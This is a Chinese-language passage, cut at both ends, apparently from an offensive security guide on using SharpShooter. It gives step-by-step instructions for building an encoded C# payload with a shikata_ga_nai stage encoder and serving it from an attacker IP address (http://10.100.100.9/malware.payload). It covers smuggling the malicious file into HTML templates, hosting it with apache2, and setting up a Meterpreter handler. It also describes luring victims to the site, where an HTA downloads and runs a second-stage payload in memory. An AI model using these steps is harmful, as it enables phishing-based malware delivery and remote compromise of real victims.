  \ StageEncoder=x86/shikata_ga_nai -f csharp`\n    *   复制介于 \"{\" 和 \"}\" 之间的所有内容作为字节数组\n\
  \n*   提供 CSharp Web 交付的 URI\n    *   输入您的攻击者 IP/端口和文件。例如：`http://10.100.100.9/malware.payload`\n\
  *   提供输出文件名称\n    *   `malware`\n*   `Y` - 您想将恶意文件混入 HTML 中吗？\n*   使用自定义 `(1)` 或预定义\
  \ `(2)` 模板\n    *   为了测试，选择任何预定义模板\n\n*   将新创建的恶意文件移动到 Web 目录\n    *   `mv output/*\
  \ /var/www/html/`\n*   为您的载荷设置 Meterpreter 处理器\n一旦配置并开发您的恶意软件，将其移至 Web 目录 (`malware.hta`,\
  \ `malware.html`, `malware.payload`)，启动您的 `apache2` 服务，并启动 Meterpreter 处理器。现在您准备好将您的受害者社交工程引导其访问您的恶意网站！上述示例是\
  \ SharpShooter 的 SharePoint Online 模板。当受害者使用 IE/Edge 访问您的恶意页面时，HTA 会自动下载并提示运行。一旦提示并选择运行，启动器载荷将运行（如果满足沙盒控制条件），下载二次载荷，并在内存中执行我们的\
